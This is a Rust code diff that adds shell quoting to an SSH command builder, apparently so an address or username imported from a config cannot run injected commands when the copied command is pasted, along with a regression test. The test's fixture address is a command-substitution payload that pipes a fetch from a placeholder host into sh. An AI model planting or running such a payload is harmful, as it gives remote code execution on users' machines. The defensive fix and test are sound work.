@@ -125,15 +125,30 @@ pub fn ssh_command(vault: &Vault, host: &Host) -> String {
         parts.push(format!("-p {}", host.port()));
     }
     if let Some(jump) = jump {
-        parts.push(format!("-J {}", jump.target()));
+        parts.push(format!("-J {}", shell_word(&jump.target())));
     }
     let (user, address) = (host.username.trim(), host.address.trim());
-    parts.push(if user.is_empty() {
+    parts.push(shell_word(&if user.is_empty() {
         address.to_owned()
     } else {
         format!("{user}@{address}")
-    });
+    }));
     parts.join(" ")
+}
+
+/// `word` as one word for a shell to paste into: as it is when it holds only what host names
+/// and logins hold, else single-quoted (bash, zsh and PowerShell take it literally), so an
+/// imported `$(…)` or `;` never runs as a command.
+fn shell_word(word: &str) -> String {
+    let plain = !word.is_empty()
+        && word
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || "._-:@%+=,/".contains(c));
+    if plain {
+        word.to_owned()
+    } else {
+        format!("'{}'", word.replace('\'', r"'\''"))
+    }
 }
 
 #[cfg(test)]
@@ -245,5 +260,23 @@ mod tests {
         host.username.clear();
         (host.port, host.jump_id) = (Some(22), None);
         assert_eq!(ssh_command(&vault, &host), "ssh 10.0.4.12");
+    }
+
+    #[test]
+    fn a_copied_ssh_command_quotes_what_a_shell_would_run() {
+        let vault = vault("ssh-quoted");
+        let mut host = vault.draft_host();
+        // An address from an imported config, made to run something when pasted.
+        host.address = "$(curl${IFS}evil|sh)".into();
+        host.username = "o'neil".into();
+        assert_eq!(
+            ssh_command(&vault, &host),
+            r"ssh 'o'\''neil@$(curl${IFS}evil|sh)'"
+        );
+        assert_eq!(
+            shell_word("deploy@web-1.example.com"),
+            "deploy@web-1.example.com"
+        );
+        assert_eq!(shell_word("10.0.0.1:2222"), "10.0.0.1:2222");
     }
 }
